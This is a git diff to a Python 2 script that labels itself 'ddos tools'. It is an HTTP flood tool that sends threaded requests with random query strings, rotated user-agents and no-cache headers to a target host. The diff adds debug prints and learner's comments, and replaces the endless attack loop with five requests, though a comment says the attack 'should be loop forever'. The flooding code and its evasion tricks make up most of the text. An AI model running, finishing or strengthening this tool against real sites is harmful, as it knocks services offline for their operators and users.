@@ -3,6 +3,13 @@
 # function : ddos tools
 # author   : firefoxbug
 
+#prombles not understood
+#1)why request url add parameter
+#2)how to make requests via agent, and more details about haeders_useragents
+#3)some other grammer details
+#4)attact function should be loop forever
+#5)main thread not kill all subthreads when time up
+
 import os
 import re
 import sys
@@ -62,7 +69,9 @@ def buildblock(size):
 	return(out_str)
 
 def send_packet(host,param_joiner):
+	# request url error
 	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	print request.get_full_url()
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -72,15 +81,22 @@ def send_packet(host,param_joiner):
 	request.add_header('Host',host)
 	try:
 		response = urllib2.urlopen(request)
+		#print('send one request')
 	except urllib2.HTTPError,error:
+	 	print 'http error'
 		pass
 	except urllib2.URLError, error:
+	 	print 'url error'
 		pass
 #	print "response code = %d "%response.code
 
 def attack(host,param_joiner):
-	while True:
+	print("begin attack")
+	# just set request for 10 times
+# 	while True:
+	for i in range(int(5)):
 		send_packet(host,param_joiner)
+	print("some attacks finished")
 
 def parse_parameters(parameters):
 
@@ -127,6 +143,7 @@ if __name__ == '__main__':
 		usage()
 		sys.exit()
 
+	print "get destination host :%s"%(host)
 	useragent_list()
 	referer_list()
 
